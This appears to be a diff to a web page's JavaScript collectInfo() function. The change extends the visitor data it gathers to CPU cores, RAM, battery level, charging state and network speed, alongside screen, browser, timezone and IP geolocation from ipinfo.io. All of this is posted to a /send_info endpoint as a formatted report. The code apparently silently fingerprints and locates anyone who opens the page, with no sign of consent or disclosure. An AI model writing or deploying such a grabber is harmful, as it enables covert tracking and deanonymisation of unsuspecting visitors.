@@ -37,6 +37,32 @@ async function collectInfo() {
   info.screen = `${screen.width}x${screen.height}`;
   info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
+  // Extra hardware info
+  if (navigator.hardwareConcurrency) {
+    info.cpuCores = navigator.hardwareConcurrency;
+  }
+  if (navigator.deviceMemory) {
+    info.ram = navigator.deviceMemory + " GB";
+  }
+
+  // Battery info
+  let batteryText = "";
+  if (navigator.getBattery) {
+    try {
+      const battery = await navigator.getBattery();
+      batteryText = `🔋 Battery: ${Math.round(battery.level * 100)}% | Charging: ${battery.charging ? "Yes" : "No"}`;
+    } catch(e) {
+      batteryText = "🔋 Battery info not available";
+    }
+  }
+
+  // Network info
+  let netText = "";
+  if (navigator.connection) {
+    netText = `📶 Network: ${navigator.connection.effectiveType}, Downlink: ${navigator.connection.downlink} Mbps`;
+  }
+
+  // IP info
   let ipData = {};
   try {
     const res = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`);
@@ -52,6 +78,10 @@ async function collectInfo() {
   text += `🖥️ *Screen:* ${info.screen}\n`;
   text += `🌐 *Browser:* ${info.userAgent}\n`;
   text += `🕒 *Timezone:* ${info.timezone}\n`;
+  if (info.cpuCores) text += `⚙️ *CPU Cores:* ${info.cpuCores}\n`;
+  if (info.ram) text += `💾 *RAM:* ${info.ram}\n`;
+  if (batteryText) text += batteryText + "\n";
+  if (netText) text += netText + "\n";
 
   fetch("/send_info", {
     method: "POST",
